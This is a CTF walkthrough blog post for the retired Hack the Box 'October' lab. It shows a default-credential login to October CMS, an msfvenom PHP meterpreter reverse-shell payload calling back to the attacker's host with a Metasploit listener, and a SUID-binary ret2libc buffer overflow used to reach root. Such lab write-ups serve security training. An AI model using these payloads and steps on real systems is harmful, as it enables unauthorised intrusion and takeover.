@@ -1,0 +1,304 @@
+
+								
+																		Hack the Box: October Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on June 29, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “October” which is available online for those who want to increase their skill in penetration testing and black box testing. October is retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.
+Level: Expert
+Task: find user.txt and root.txt file on victim’s machine.
+Since these labs are online available therefore they have static IP and IP of sense is 10.10.10.16 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -sV 10.10.10.16
+			
+				
+					
+				
+					1
+				
+						nmap -sV 10.10.10.16
+					
+				
+			
+		
+
+From given below image, you can observe we found port 22 and 80 are open on target system.
+
+As port 80 is running http server we open the target machine’s ip address in our browser, and find that it is running octobercms.
+
+We go to the default admin login page for octobercms at http://10.10.10.16/backend/backend/auth/signin.
+
+We can login to this CMS with default credentials; Username: admin Password: admin
+
+And we got the admin access to October CMS, Now to get reverse shell first rename your php payload to ‘.php5 ‘. We use msfvenom to create a php payload and save it as shell.php5.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp  lhost=10.10.14.25 lport=4444 -f raw &gt; shell.php5
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp  lhost=10.10.14.25 lport=4444 -f raw &gt; shell.php5
+					
+				
+			
+		
+
+
+After create the payload we setup our listener using metasploit.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use exploit/multi/handler
+msf &gt; exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
+msf &gt; exploit(multi/handler) &gt; set lhost 10.10.14.25
+msf &gt; exploit(multi/handler) &gt; set lport 4444
+msf &gt; exploit(multi/handler) &gt; run
+			
+				
+					
+				
+					12345
+				
+						msf &gt; use exploit/multi/handlermsf &gt; exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcpmsf &gt; exploit(multi/handler) &gt; set lhost 10.10.14.25msf &gt; exploit(multi/handler) &gt; set lport 4444msf &gt; exploit(multi/handler) &gt; run
+					
+				
+			
+		
+
+ 
+Now click on Media in the top toolbar, now upload your PHP reverse shell, and click on the public link which is on the right side.
+
+As soon as we click on the link we get our revershell. We use sysinfo command to check the system information about the target machine.
+
+Now spawn a tty shell and try to find binaries in the system with suid bit set.
+
+		
+		
+			
+			
+			
+			
+meterpreter  &gt; shell
+python -c "import pty;pty.spawn('/bin/bash')"
+find / -perm -4000 2&gt;/dev/null
+			
+				
+					
+				
+					123
+				
+						meterpreter  &gt; shellpython -c "import pty;pty.spawn('/bin/bash')"find / -perm -4000 2&gt;/dev/null
+					
+				
+			
+		
+
+
+We find a binary called ovrflw that has suid bit set. We download the file into our system using meterpreter.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; download /usr/local/bin/ovrflw /root/Desktop
+			
+				
+					
+				
+					1
+				
+						meterpreter &gt; download /usr/local/bin/ovrflw /root/Desktop
+					
+				
+			
+		
+
+
+We open the file in gdb and take a look at the assembly code. At line main+64 we find the strcpy function, As strcpy is vulnerable to buffer overflow we try to exploit it.
+
+First we create a 150 bytes long string to find the EIP offset using patter_create script.
+
+		
+		
+			
+			
+			
+			
+./pattern_create.rb  -l 150
+			
+				
+					
+				
+					1
+				
+						./pattern_create.rb  -l 150
+					
+				
+			
+		
+
+
+We run the file in gdb along with the 150 byte character as the argument and find that the EIP register was overwritten with 0x64413764.
+
+We pass that into /usr/share/metasploit-framework/tools/pattern_offset.rb, we get an offset of 112. So we need to write 112 characters and then write the address of the instructions we want to be executed.
+
+		
+		
+			
+			
+			
+			
+./pattern_offset.rb -q 64413764 -l 150
+			
+				
+					
+				
+					1
+				
+						./pattern_offset.rb -q 64413764 -l 150
+					
+				
+			
+		
+
+
+Now when we try to insert shellcode into the buffer but we were unable to execute it because of DEP. It prevents code from being executed in the stack. Now we are going to do a ret2libc attack to execute a process already present in the process’ executable memory. We go into the target machine and find ASLR in enabled so we have to brute force the address. Now we find the address of system, exit and /bin/sh.
+
+		
+		
+			
+			
+			
+			
+gdb /usr/local/bin/ovrflw -q
+(gdb) b main
+(gdb) run
+(gdb) p system
+(gdb) find 0xb75bd310, +9999999, "/bin/sh"
+(gdb) x/s 0xb76dfbac
+(gdb) p exit
+			
+				
+					
+				
+					1234567
+				
+						gdb /usr/local/bin/ovrflw -q(gdb) b main(gdb) run(gdb) p system(gdb) find 0xb75bd310, +9999999, "/bin/sh"(gdb) x/s 0xb76dfbac(gdb) p exit
+					
+				
+			
+		
+
+
+Now we create our exploit we brute force the address using bash because of ASLR. We align the address in this order: system&gt;exit&gt;/bin/sh.  We get the root shell as soon as it matches our memory address.
+
+After getting the root shell, we move to /root directory and find a file called root.txt we open the file and find the first flag.
+
+After finding the first flag we go to /home/ directory, in home directory and find a directory called harry/. We go inside harry directory and find a file called user.txt, we open user.txt and find our final flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
